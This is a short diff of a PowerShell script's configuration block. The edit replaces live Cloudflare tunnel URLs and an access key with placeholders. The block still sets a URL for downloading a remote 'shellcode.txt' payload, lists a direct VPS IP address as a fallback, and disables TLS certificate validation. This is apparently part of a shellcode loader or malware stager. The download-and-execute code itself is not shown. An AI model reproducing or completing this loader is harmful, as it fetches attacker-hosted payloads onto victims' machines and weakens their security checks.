@@ -9,9 +9,9 @@ param(
 )
 
 # === CONFIGURATION - Update this URL! ===
-# Cloudflare Tunnel (changes on restart): https://decision-provinces-officers-follows.trycloudflare.com/shellcode.txt
+# Cloudflare Tunnel (changes on restart): https://CHANGE-MECHANGE-ME.trycloudflare.com/shellcode.txt
 # VPS Direct (if needed): https://216.126.227.250:9000/shellcode.txt
-$ShellcodeURL = "https://concentrations-omaha-topic-hanging.trycloudflare.com/payloads/shellcode.txt?key=b45140e1b16ca05973c1fa308729c8fc"
+$ShellcodeURL = "https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN"
 
 # Trust self-signed certificate
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
